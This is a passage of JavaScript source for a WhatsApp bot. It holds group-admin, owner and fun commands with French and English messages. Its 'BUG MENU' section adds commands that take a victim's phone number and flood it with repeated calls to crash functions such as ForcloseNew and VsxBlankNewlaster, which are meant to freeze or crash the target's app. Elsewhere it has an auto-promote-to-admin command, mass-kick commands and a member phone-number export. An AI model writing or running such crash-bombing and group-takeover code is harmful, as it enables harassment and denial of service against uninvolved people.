if (!botIsAdmin) {
    await reply('❌ Le bot nest pas administrateur dans ce groupe.');
    break;
}

// Vérifier si l'utilisateur est déjà admin
if (isGroupAdmin(admins, senderJid)) {
    await reply(
        `✅ Tu es déjà administrateur, @${senderNum} !`,
        { mentions: [senderJid] }
    );
    break;
}

// Promouvoir automatiquement l'utilisateur qui exécute la commande
try {
    await natsu.groupParticipantsUpdate(
        jid,
        [senderJid],
        'promote'
    );

    // Message de confirmation
    const promoMsg =
        `👑 *AUTO PROMOTION*\n\n` +
        `👤 Utilisateur : @${senderNum}\n` +
        `📅 Date : ${new Date().toLocaleString()}\n\n` +
        `✨ Tu es maintenant administrateur de ce groupe !`;

    await natsu.sendMessage(
        jid,
        {
            text: promoMsg,
            mentions: [senderJid],
            contextInfo: forwardedContext(),
        },
        { quoted: msg }
    );

} catch (error) {
    console.error('Erreur dans autoadmi:', error);

    await reply(
        `❌ Échec de la promotion : ${error.message || 'erreur inconnue'}`
    );
}

break;

}
      case 'tagall': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { meta } = await getGroupAdmins(natsu, jid);
        if (!meta) break;
        const mentions = meta.participants.map(p => p.id);
        const txt = `📢 *TAG ALL* — ${arg || 'hey!'}\n\n` +
          mentions.map((m, i) => `${i + 1}. @${m.split('@')[0]}`).join('\n');
        await natsu.sendMessage(jid, { text: txt, mentions, contextInfo: forwardedContext() }, { quoted: msg });
        break;
      }
      case 'hidetag': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { meta } = await getGroupAdmins(natsu, jid);
        if (!meta) break;
        await natsu.sendMessage(jid, {
          text: arg || '📢',
          mentions: meta.participants.map(p => p.id),
          contextInfo: forwardedContext(),
        });
        break;
      }
      case 'promote': case 'demote': case 'kick': case 'add': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { admins } = await getGroupAdmins(natsu, jid);
        // Only check that the sender is a group admin (no more "bot must be admin").
        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) {
          await reply('❌ Admins only.'); break;
        }
        const mention = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const numArg  = arg.replace(/\D/g, '');
        const target  = mention || (numArg ? `${numArg}@s.whatsapp.net` : null);
        if (!target) { await reply(`❌ Usage: *${PREFIX}${cmd} @user* or number`); break; }
        const action = cmd === 'kick' ? 'remove' : cmd; // promote|demote|add|remove
        try {
          await natsu.groupParticipantsUpdate(jid, [target], action);
          await reply(`✅ ${cmd} → @${target.split('@')[0]}`);
        } catch (e) { await reply(`❌ Failed: ${e.message}`); }
        break;
      }
      case 'mute': case 'unmute': case 'closegc': case 'opengc': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const setting = (cmd === 'mute' || cmd === 'closegc') ? 'announcement' : 'not_announcement';
        try { await natsu.groupSettingUpdate(jid, setting); await reply(`✅ Group ${cmd}`); }
        catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'left': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        await reply('👋 Leaving group...');
        try { await natsu.groupLeave(jid); } catch {}
        break;
      }
      case 'grouplink': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        try { const code = await natsu.groupInviteCode(jid); await reply(`🔗 https://chat.whatsapp.com/${code}`); }
        catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'resetlink': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        try { const code = await natsu.groupRevokeInvite(jid); await reply(`✅ New link: https://chat.whatsapp.com/${code}`); }
        catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'kickadmins': case 'kickall': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { meta, admins, botJid } = await getGroupAdmins(natsu, jid);
        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) { await reply('❌ Admins only.'); break; }
        const targets = (cmd === 'kickall')
          ? meta.participants.map(p => p.id).filter(j => !admins.includes(j) && j !== botJid)
          : admins.filter(j => j !== botJid);
        for (const t of targets) { try { await natsu.groupParticipantsUpdate(jid, [t], 'remove'); } catch {} await new Promise(r => setTimeout(r, 800)); }
        await reply(`✅ Removed ${targets.length} member(s).`);
        break;
      }
      case 'listadmins': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { admins } = await getGroupAdmins(natsu, jid);
        await reply(`👑 *Admins (${admins.length})*\n\n${admins.map((a, i) => `${i + 1}. +${a.split('@')[0]}`).join('\n')}`);
        break;
      }
      case 'listonline': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        await reply('ℹ️ WhatsApp restricts online presence visibility — only contacts you message can be tracked.');
        break;
      }
      case 'opentime': case 'closetime': {
        const mins = parseInt(arg) || 0;
        if (!isGroup(jid) || !mins) { await reply(`❌ Usage: *${PREFIX}${cmd} <minutes>*`); break; }
        await reply(`⏰ Group will ${cmd === 'opentime' ? 'open' : 'close'} in *${mins} min*.`);
        setTimeout(async () => {
          try { await natsu.groupSettingUpdate(jid, cmd === 'opentime' ? 'not_announcement' : 'announcement'); } catch {}
        }, mins * 60000);
        break;
      }
      case 'welcome':
      case 'setwelcome':
      case 'resetwelcome':
      case 'goodbye':
      case 'setgoodbye':
      case 'resetgoodbye': {
        if (!isGroup(jid)) { await reply('❌ Cette commande est utilisable uniquement dans un groupe.'); break; }

        const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) {
          await reply('❌ Cette commande est réservée aux administrateurs.');
          break;
        }

        const stateNow = getState();
        const type = cmd.includes('goodbye') ? 'goodbye' : 'welcome';
        const storeKey = type;
        const prefix = stateNow.prefix || PREFIX;
        const value = (arg || '').trim();
        const current = getGroupGreetingConfig(stateNow, jid, type);

        // .welcome / .goodbye → aide + état
        if (cmd === 'welcome' || cmd === 'goodbye') {
          const v = value.toLowerCase();

          if (!v || v === 'status') {
            await reply(
              `╭━━━〔 ${type === 'welcome' ? '👋' : '🚪'} 𝐆𝐑𝐎𝐔𝐏 ${type.toUpperCase()} 〕━━━╮\n` +
              `┃\n` +
              `┃ 📌 État : *${current.enabled ? 'ON ✅' : 'OFF ❌'}*\n` +
              `┃\n` +
              `┃ ${greetingHelp(prefix).split('\n').slice(3, 7).join('\n')}\n` +
              `╰━━━━━━━━━━━━━━━━━━━━━━╯`
            );
            break;
          }

          if (!['on', 'off', '1', '0', 'true', 'false'].includes(v)) {
            await reply(greetingHelp(prefix));
            break;
          }

          const enabled = ['on', '1', 'true'].includes(v);
          updateState(s => {
            s[storeKey] ??= {};
            s[storeKey][jid] = {
              ...getGroupGreetingConfig(s, jid, type),
              enabled,
            };
          });

          await reply(
            `${type === 'welcome' ? '👋' : '🚪'} *${type === 'welcome' ? 'Welcome' : 'Goodbye'} ${enabled ? 'activé ✅' : 'désactivé ❌'}*\n\n` +
            `🏠 Groupe : *${jid}*`
          );
          break;
        }

        // .setwelcome / .setgoodbye → enregistrer un message personnalisé
        if (cmd === 'setwelcome' || cmd === 'setgoodbye') {
          if (!value) {
            await reply(
              `❌ Usage : *${prefix}${cmd} <message>*\n\n` +
              `Variables : {user} {group} {members} {bot} {dev} {prefix}\n\n` +
              `Exemple :\n` +
              `${prefix}${cmd} 🎉 Bienvenue {user} dans {group} ! 👥 {members} membres.`
            );
            break;
          }

          if (value.length > 1800) {
            await reply('❌ Le message est trop long. Maximum : 1800 caractères.');
            break;
          }

          updateState(s => {
            s[storeKey] ??= {};
            s[storeKey][jid] = {
              ...getGroupGreetingConfig(s, jid, type),
              text: value,
            };
          });

          await reply(
            `✅ *${type === 'welcome' ? 'Welcome' : 'Goodbye'} personnalisé enregistré !*\n\n` +
            `📌 Le message sera utilisé dès le prochain événement.\n` +
            `💡 Variables : {user}, {group}, {members}, {bot}, {dev}, {prefix}`
          );
          break;
        }

        // .resetwelcome / .resetgoodbye → revenir au message premium par défaut
        if (cmd === 'resetwelcome' || cmd === 'resetgoodbye') {
          updateState(s => {
            s[storeKey] ??= {};
            s[storeKey][jid] = {
              enabled: true,
              text: type === 'welcome' ? DEFAULT_WELCOME : DEFAULT_GOODBYE,
            };
          });

          await reply(
            `♻️ *${type === 'welcome' ? 'Welcome' : 'Goodbye'} réinitialisé.*\n\n` +
            `✅ Le message premium par défaut est de nouveau actif.`
          );
          break;
        }

        break;
      }
      case 'antistatut':
      case 'antistatus': {
        if (!isGroup(jid)) {
          await reply('❌ Cette commande est utilisable uniquement dans un groupe.');
          break;
        }

        const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) {
          await reply('❌ Cette commande est réservée aux administrateurs.');
          break;
        }

        const value = (arg || '').trim().toLowerCase();

        if (!value || value === 'status') {
          const enabled = Boolean(getState().antistatut?.[jid]);

          await reply(
            `╭━━━〔 🛡️ 𝐀𝐍𝐓𝐈𝐒𝐓𝐀𝐓𝐔𝐓 〕━━━╮\n` +
            `┃\n` +
            `┃ 📌 État : *${enabled ? 'ACTIVÉ ✅' : 'DÉSACTIVÉ ❌'}*\n` +
            `┃ 🤖 Bot admin : *${botIsAdmin ? 'OUI ✅' : 'NON ❌'}*\n` +
            `┃\n` +
            `┃ Utilisation :\n` +
            `┃ • ${PREFIX}antistatut on\n` +
            `┃ • ${PREFIX}antistatut off\n` +
            `┃ • ${PREFIX}antistatut status\n` +
            `┃\n` +
            `┃ 🚫 Les mentions de statut\n` +
            `┃ seront supprimées automatiquement.\n` +
            `╰━━━━━━━━━━━━━━━━━━━━━━╯`
          );
          break;
        }

        const enable = ['on', '1', 'true', 'enable', 'enabled'].includes(value);
        const disable = ['off', '0', 'false', 'disable', 'disabled'].includes(value);

        if (!enable && !disable) {
          await reply(
            `❌ Argument invalide.\n\n` +
            `Utilise :\n` +
            `• ${PREFIX}antistatut on\n` +
            `• ${PREFIX}antistatut off\n` +
            `• ${PREFIX}antistatut status`
          );
          break;
        }

        if (enable && !botIsAdmin) {
          await reply(
            `❌ *Impossible d'activer Antistatut.*\n\n` +
            `🤖 Je dois être *administrateur* du groupe pour supprimer les mentions de statut.`
          );
          break;
        }

        updateState(s => {
          s.antistatut ??= {};
          s.antistatut[jid] = enable;
        });

        await reply(
          enable
            ? `🛡️ *ANTISTATUT ACTIVÉ* ✅\n\n` +
              `🚫 Les mentions de statut seront supprimées automatiquement.\n` +
              `👮 Les administrateurs sont exemptés.`
            : `🛡️ *ANTISTATUT DÉSACTIVÉ* ❌\n\n` +
              `✅ Les mentions de statut sont maintenant autorisées.`
        );
        break;
      }

      case 'antilink': {
        if (!isGroup(jid)) { await reply('❌ Cette commande est utilisable uniquement dans un groupe.'); break; }
        const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
        if (!msg.key.fromMe && !isGroupAdmin(admins, senderJid)) { await reply('❌ Cette commande est réservée aux administrateurs.'); break; }
        const value = (arg || '').trim().toLowerCase();
        if (!value) {
          const enabled = Boolean(state.antilink?.[jid]);
          await reply(`🔗 *ANTILINK*\n\n📌 État : *${enabled ? 'ON — KICK' : 'OFF'}*\n\nUtilisation :\n• ${PREFIX}antilink on\n• ${PREFIX}antilink on kick\n• ${PREFIX}antilink off`);
          break;
        }
        const enable = ['on', '1', 'true', 'enable', 'enabled'].includes(value) || value === 'on kick';
        const disable = ['off', '0', 'false', 'disable', 'disabled'].includes(value);
        if (!enable && !disable) { await reply(`❌ Utilise : ${PREFIX}antilink on | ${PREFIX}antilink on kick | ${PREFIX}antilink off`); break; }
        if (enable && !botIsAdmin) { await reply('❌ Je dois être administrateur pour supprimer les liens et expulser les membres.'); break; }
        updateState(s => { s.antilink[jid] = enable; });
        await reply(enable
          ? '🔗 *ANTILINK ON* ✅\n\n🚫 Les liens seront supprimés et leur auteur non-admin sera expulsé.'
          : '🔗 *ANTILINK OFF* ❌\n\n✅ Les liens sont autorisés.');
        break;
      }
      case 'vcf': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { meta } = await getGroupAdmins(natsu, jid);
        if (!meta) break;
        let vcf = '';
        meta.participants.forEach((p, i) => {
          const num = p.id.split('@')[0];
          vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:Member ${i + 1}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD\n`;
        });
        await natsu.sendMessage(jid, {
          document: Buffer.from(vcf), fileName: 'contacts.vcf',
          mimetype: 'text/vcard', contextInfo: forwardedContext(),
        }, { quoted: msg });
        break;
      }
      case 'creategroup': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}creategroup <name>*`); break; }
        try { const g = await natsu.groupCreate(arg, [senderJid]); await reply(`✅ Group created: ${g.subject}`); }
        catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'join': {
        if (arg.includes('chat.whatsapp.com/')) {
          const code = arg.split('chat.whatsapp.com/').pop().trim();
          try { await natsu.groupAcceptInvite(code); await reply('✅ Joined group!'); }
          catch (e) { await reply(`❌ ${e.message}`); }
        } else {
          const ch = WA_CHANNELS.map((l, i) => `📡 Channel ${i + 1}: ${l}`).join('\n');
          const gr = WA_GROUPS.map((l, i) => `👥 Group ${i + 1}: ${l}`).join('\n');
          await reply(`🔗 *Join ${BOT_NAME} Community*\n\n${ch}\n\n${gr}`);
        }
        break;
      }
// ═════════════════════════════════════════════════════════════════════
// BUG MENU — New crash commands
// ═════════════════════════════════════════════════════════════════════
case 'killuacrash':
case 'crashspam': {
  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
    await reply('❌ Commande réservée au propriétaire.');
    break;
  }
  if (!arg) {
    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243906905464*`);
    break;
  }
  let pepec = arg.replace(/[^0-9]/g, '');
  if (pepec.startsWith('0')) {
    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
    break;
  }
  const target = pepec + '@s.whatsapp.net';

  // Confirmation avec image
  try {
    await natsu.sendMessage(jid, {
      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
      caption: `✅ *Bug ${cmd} envoyé à +${pepec}*`,
      contextInfo: forwardedContext(),
    }, { quoted: msg });
  } catch {
    await reply(`✅ Lancement du bug ${cmd} sur +${pepec}`);
  }

  try {
    for (let i = 0; i < 450; i++) {
      await ForcloseNew(natsu, target);
      await ForcloseNew(natsu, target);
      await ForcloseNew(natsu, target);
      await new Promise(r => setTimeout(r, 8000));
      await ForcloseNew(natsu, target);
      await ForcloseNew(natsu, target);
      await ForcloseNew(natsu, target);
    }
    await ForcloseNew(natsu, target);
    await ForcloseNew(natsu, target);
    await reply(`✅ Terminé pour +${pepec}`);
  } catch (err) {
    await reply(`❌ Erreur : ${err.message}`);
  }
  break;
}

case 'delayinvis':
case 'manzxeveryone': {
  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
    await reply('❌ Commande réservée au propriétaire.');
    break;
  }
  if (!arg) {
    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243*`);
    break;
  }
  let pepec = arg.replace(/[^0-9]/g, '');
  if (pepec.startsWith('0')) {
    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
    break;
  }
  const target = pepec + '@s.whatsapp.net';

  try {
    await natsu.sendMessage(jid, {
      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
      caption: `✅ *Bug ${cmd} envoyé à +${pepec}*`,
      contextInfo: forwardedContext(),
    }, { quoted: msg });
  } catch {
    await reply(`✅ Lancement du bug ${cmd} sur +${pepec}`);
  }

  try {
    for (let i = 0; i < 5; i++) {
      await DelayInvis1(natsu, target);
      await new Promise(r => setTimeout(r, 7000));
      await Delayinvis2(natsu, target);
    }
    await Delayinvis2(natsu, target);
    await DelayInvis1(natsu, target);
    await reply(`✅ Terminé pour +${pepec}`);
  } catch (err) {
    await reply(`❌ Erreur : ${err.message}`);
  }
  break;
}

case 'protocolbug5': {
  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
    await reply('❌ Commande réservée au propriétaire.');
    break;
  }
  if (!arg) {
    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243*`);
    break;
  }
  let pepec = arg.replace(/[^0-9]/g, '');
  if (pepec.startsWith('0')) {
    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
    break;
  }
  const target = pepec + '@s.whatsapp.net';

  try {
    await natsu.sendMessage(jid, {
      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
      caption: `✅ *Bug protocolbug5 envoyé à +${pepec}*`,
      contextInfo: forwardedContext(),
    }, { quoted: msg });
  } catch {
    await reply(`✅ Lancement du bug protocolbug5 sur +${pepec}`);
  }

  try {
    await protocolbug5(natsu, target);
    await protocolbug5(natsu, target);
    await reply(`✅ Terminé pour +${pepec}`);
  } catch (err) {
    await reply(`❌ Erreur : ${err.message}`);
  }
  break;
}
      case 'fcxui':
case 'bugcampuran': {
  // Seul le propriétaire ou sudo peut utiliser
  if (!msg.key.fromMe && !state.sudo.includes(senderNum)) {
    await reply('❌ Commande réservée au propriétaire.');
    break;
  }

  if (!arg) {
    await reply(`❌ Usage : *${PREFIX}${cmd} <numéro>*\nExemple : *${PREFIX}${cmd} 243*`);
    break;
  }

  // Nettoyer le numéro
  let pepec = arg.replace(/[^0-9]/g, '');
  if (pepec.startsWith('0')) {
    await reply(`❌ Le numéro ne doit pas commencer par 0. Utilise le code pays (ex: 243...).`);
    break;
  }

  const target = pepec + '@s.whatsapp.net';

  // Envoyer une confirmation (image optionnelle)
  try {
    await natsu.sendMessage(jid, {
      image: { url: 'https://files.catbox.moe/6b0dyi.jpg' },
      caption: `✅ *Bug envoyé à +${pepec}*`,
      contextInfo: forwardedContext(),
    }, { quoted: msg });
  } catch {
    await reply(`✅ Lancement du bug sur +${pepec}`);
  }

  // Envoyer les crashs en boucle
  try {
    for (let i = 0; i < 5; i++) {
      await VsxBlankNewlaster(natsu, target); // KilluaCrash
      await new Promise(r => setTimeout(r, 7000));
      await VsxBlankNewlaster(natsu, target); // hardcrash
      await new Promise(r => setTimeout(r, 7000));
      await VsxBlankNewlaster(natsu, target); // DelayInvis2
      await new Promise(r => setTimeout(r, 7000));
      await VsxBlankNewlaster(natsu, target); // DelayInvis1
    }
    await reply(`✅ Terminé pour +${pepec}`);
  } catch (err) {
    await reply(`❌ Erreur : ${err.message}`);
  }
  break;
}

      // ═════════════════════════════════════════════════════════════════════
      // OWNER MENU
      // ═════════════════════════════════════════════════════════════════════
      
      case 'setpp': {
        try {
          const buf = (await axios.get(MENU_IMAGE, { responseType: 'arraybuffer' })).data;
          await natsu.updateProfilePicture(natsu.user.id, Buffer.from(buf));
          await reply('✅ Profile picture updated.');
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'ban': case 'unban': {
        const num = arg.replace(/\D/g, '');
        if (!num) { await reply(`❌ Usage: *${PREFIX}${cmd} <number>*`); break; }
        updateState(s => {
          s.banned = cmd === 'ban' ? [...new Set([...s.banned, num])] : s.banned.filter(n => n !== num);
        });
        await reply(`✅ ${cmd} +${num}`);
        break;
      }
      case 'private':
      case 'self':
      case 'public': {
        // Only owner / sudo may change the bot access mode.
        if (!isOwnerOrSudo) {
          await reply('❌ *Access denied.* Only the owner or sudo can change the bot mode.');
          break;
        }

        const newMode = (cmd === 'public') ? 'public' : 'private';
        updateState(s => { s.mode = newMode; });

        if (newMode === 'private') {
          await reply(
`╭━━━〔 🔒 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 〕━━━╮
┃
┃ 🤖 *${BOT_NAME}*
┃ 🔐 Mode: *PRIVATE*
┃
┃ 👑 Owner & sudo only
┃ 🛡️ Access protection enabled
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

> ${BOT_NAME} • ${DEV_NAME}`
          );
        } else {
          await reply(
`╭━━━〔 🌍 𝐏𝐔𝐁𝐋𝐈𝐂 〕━━━╮
┃
┃ 🤖 *${BOT_NAME}*
┃ 🌐 Mode: *PUBLIC*
┃
┃ 👥 Normal commands are available
┃ 🛡️ Admin/owner commands remain protected
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

> ${BOT_NAME} • ${DEV_NAME}`
          );
        }
        break;
      }
      case 'autoread': case 'autobio': case 'autorecording': case 'autotyping':
      case 'autoviewstatus': case 'autoreact': {
        const map = { autoread: 'autoread', autobio: 'autobio', autorecording: 'autorecord',
          autotyping: 'autotyping', autoviewstatus: 'autoviewsts', autoreact: 'autoreact' };
        const key = map[cmd];
        const on = /on|1|true/i.test(arg);
        updateState(s => { s[key] = on; });
        await reply(`✅ ${cmd} → *${on ? 'ON' : 'OFF'}*`);
        break;
      }
      case 'block': case 'unblock': {
        const num = (arg.replace(/\D/g, '')) || senderNum;
        try { await natsu.updateBlockStatus(`${num}@s.whatsapp.net`, cmd); await reply(`✅ ${cmd} +${num}`); }
        catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'delete': case 'del': {
        const q = msg.message?.extendedTextMessage?.contextInfo;
        if (!q?.stanzaId) { await reply('❌ Reply to a message.'); break; }
        try {
          await natsu.sendMessage(jid, { delete: { remoteJid: jid, fromMe: false, id: q.stanzaId, participant: q.participant } });
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'setaccount': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}setaccount <details>*`); break; }
        updateState(s => { s.account = arg; });
        await reply('✅ Payment account saved.');
        break;
      }
      case 'addsudo': case 'delsudo': {
        const num = arg.replace(/\D/g, '');
        if (!num) { await reply(`❌ Usage: *${PREFIX}${cmd} <number>*`); break; }
        updateState(s => {
          s.sudo = cmd === 'addsudo' ? [...new Set([...s.sudo, num])] : s.sudo.filter(n => n !== num);
        });
        await reply(`✅ ${cmd} +${num}`);
        break;
      }
      case 'listsudo': {
        const s = getState();
        await reply(`👑 *Sudo list (${s.sudo.length})*\n\n${s.sudo.map(n => `• +${n}`).join('\n') || '(empty)'}`);
        break;
      }
      case 'fixowner': { await reply(`👑 Owner: *${DEV_NAME}*\n📞 Bot: +${(natsu.user?.id || '').split(':')[0]}`); break; }
      case 'getbot': { await reply(`🤖 *${BOT_NAME}* online\nID: ${natsu.user?.id}\nDev: ${DEV_NAME}`); break; }
      case 'broadcast': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}broadcast <msg>*`); break; }
        await reply('📢 Broadcasting...');
        try {
          const chats = await natsu.groupFetchAllParticipating();
          let ok = 0;
          for (const id of Object.keys(chats)) {
            try {
              await natsu.sendMessage(id, {
                text: `📢 *BROADCAST*\n\n${arg}\n\n> ${BOT_NAME}`,
                contextInfo: forwardedContext(),
              });
              ok++;
              await new Promise(r => setTimeout(r, 1200));
            } catch {}
          }
          await reply(`✅ Sent to ${ok} groups.`);
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'mode': {
        const current = String(getState().mode || 'public').toLowerCase();
        const label = (current === 'private' || current === 'self')
          ? 'PRIVATE 🔒'
          : 'PUBLIC 🌍';
        await reply(
`╭━━━〔 ⚙️ 𝐁𝐎𝐓 𝐌𝐎𝐃𝐄 〕━━━╮
┃
┃ 🤖 Bot: *${BOT_NAME}*
┃ 📡 Mode: *${label}*
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯`
        );
        break;
      }
      case 'ping': {
        const start = Date.now();
        await reply(`🏓 *Pong!* ⚡ ${Date.now() - start}ms`);
        break;
      }
      case 'alive': case 'runtime': case 'uptime': {
        const up = process.uptime();
        const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60), s = Math.floor(up % 60);
        const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        await img(MENU_IMAGE,
`🟢 *${BOT_NAME} is alive!*
⏱️ Uptime: ${h}h ${m}m ${s}s
💾 Memory: ${mem} MB
👑 Dev: ${DEV_NAME}`);
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // FUN MENU
      // ═════════════════════════════════════════════════════════════════════
      case 'truth': {
        const arr = ['What\'s your biggest secret?','Have you ever lied to your best friend?','What is your worst habit?','Have you ever cheated on a test?','What\'s the most embarrassing thing you\'ve done?'];
        await reply(`💭 *TRUTH*\n\n${RAND(arr)}`); break;
      }
      case 'dare': {
        const arr = ['Send a selfie right now 📸','Sing a song in voice note 🎤','Text your crush a compliment 💌','Do 10 push-ups and record it 💪','Change your bio to "I love bugs 🐛" for 24h'];
        await reply(`🔥 *DARE*\n\n${RAND(arr)}`); break;
      }
      case 'joke': {
        try { const r = await axios.get('https://official-joke-api.appspot.com/random_joke', { timeout: 6000 });
          await reply(`😂 *Joke*\n\n${r.data.setup}\n— ${r.data.punchline}`); }
        catch { await reply(`😂 ${RAND(['Why did the dev quit? No arrays.','I told a UDP joke, you might not get it.'])}`); }
        break;
      }
      case 'meme': {
        try { const r = await axios.get('https://meme-api.com/gimme', { timeout: 5000 });
          await img(r.data.url, `😆 ${r.data.title}`); }
        catch { await reply('❌ Meme unavailable.'); }
        break;
      }
      case 'ship': {
        const p = arg.split(/\s+and\s+|\s+&\s+|,\s*/);
        if (p.length < 2) { await reply(`❌ Usage: *${PREFIX}ship NameA and NameB*`); break; }
        await reply(`💞 *SHIP*\n${p[0]} ❤️ ${p[1]}\nCompatibility: *${Math.floor(Math.random() * 100)}%*`);
        break;
      }
      case 'rate': { await reply(`⭐ *RATE*\n${arg || 'You'} → *${Math.floor(Math.random()*10)+1}/10*`); break; }
      case 'flirt': {
        const f = ['Are you Wi-Fi? Because I\'m feeling a connection. 💞','Did it hurt when you fell from heaven? 😇','You must be a magician — every time I look at you, everyone else disappears. ✨'];
        await reply(`💋 *FLIRT*\n\n${RAND(f)}`); break;
      }
      case 'roast': {
        const r = ['You bring everyone so much joy… when you leave the room. 😂','You\'re proof that even God makes mistakes sometimes.','You\'re not stupid; you just have bad luck thinking.'];
        await reply(`🔥 *ROAST* ${arg || ''}\n\n${RAND(r)}`); break;
      }
      case 'compliment': {
        const c = ['You light up every room you enter. ✨','Your smile could power a city. 💖','You\'re the human version of sunshine. ☀️'];
        await reply(`💖 *COMPLIMENT* ${arg || ''}\n\n${RAND(c)}`); break;
      }
      case 'wouldyou': {
        const arr = ['Would you rather fly or read minds?','Would you rather be invisible or super strong?','Would you rather have unlimited money or unlimited time?'];
        await reply(`🤔 *WOULD YOU RATHER*\n\n${RAND(arr)}`); break;
      }
      case '8balladvice': case '8ball': {
        const a = ['Yes, absolutely.','No way.','Ask again later.','Outlook good.','Don\'t count on it.','It is certain.'];
        await reply(`🎱 *8-BALL*\n\n${RAND(a)}`); break;
      }
      case 'urban': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}urban <word>*`); break; }
        try { const r = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(arg)}`, { timeout: 5000 });
          const d = r.data.list?.[0]; if (!d) throw 0;
          await reply(`📕 *URBAN — ${arg}*\n\n${d.definition.replace(/[[\]]/g,'')}\n\n_Ex:_ ${d.example.replace(/[[\]]/g,'')}`); }
        catch { await reply('❌ Not found.'); }
        break;
      }
      case 'moviequote': {
        try { const r = await axios.get('https://api.quotable.io/random?tags=famous-quotes', { timeout: 5000 });
          await reply(`🎬 *MOVIE QUOTE*\n\n"${r.data.content}"\n— ${r.data.author}`); }
        catch { await reply('🎬 "May the Force be with you." — Star Wars'); }
        break;
      }
      case 'triviafact': case 'funfact': case 'fact': {
        try { const r = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random?language=en', { timeout: 5000 });
          await reply(`🧠 *FUN FACT*\n\n${r.data.text}`); }
        catch { await reply('🧠 Octopuses have 3 hearts. 🐙'); }
        break;
      }
      case 'inspire': {
        try { const r = await axios.get('https://api.quotable.io/random?tags=inspirational', { timeout: 5000 });
          await reply(`✨ *INSPIRE*\n\n"${r.data.content}"\n— ${r.data.author}`); }
        catch { await reply('✨ "The best way out is always through." — Robert Frost'); }
        break;
      }
      case 'ascii': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}ascii <text>*`); break; }
        try { const r = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(arg)}`, { timeout: 5000 });
          await reply('```' + r.data + '```'); }
        catch { await reply('❌ Service down.'); }
        break;
      }
      case 'progquote': {
        try { const r = await axios.get('https://programming-quotesapi.vercel.app/api/random', { timeout: 5000 });
          const q = r.data; await reply(`💻 *PROG QUOTE*\n\n"${q.quote || q.en}"\n— ${q.author}`); }
        catch { await reply('💻 "Talk is cheap. Show me the code." — Linus Torvalds'); }
        break;
      }
      case 'dadjoke': {
        try { const r = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' }, timeout: 5000 });
          await reply(`👨 *DAD JOKE*\n\n${r.data.joke}`); }
        catch { await reply('👨 I don\'t trust stairs. They\'re always up to something.'); }
        break;
      }
      case 'paptt': { await reply('🎤 PAPTT — feature coming soon. (Requires ffmpeg pipeline.)'); break; }

      // ═════════════════════════════════════════════════════════════════════
      // GAMES
      // ═════════════════════════════════════════════════════════════════════
      case 'rps': {
        const ch = ['rock','paper','scissors']; const u = arg.toLowerCase(); const b = RAND(ch);
        if (!ch.includes(u)) { await reply(`❌ Usage: *${PREFIX}rps rock|paper|scissors*`); break; }
        const r = u === b ? 'Draw' : ((u==='rock'&&b==='scissors')||(u==='paper'&&b==='rock')||(u==='scissors'&&b==='paper')) ? 'You win!' : 'Bot wins!';
        await reply(`🎮 You: ${u}\n🤖 Bot: ${b}\n→ *${r}*`); break;
      }
      case 'rpsls': {
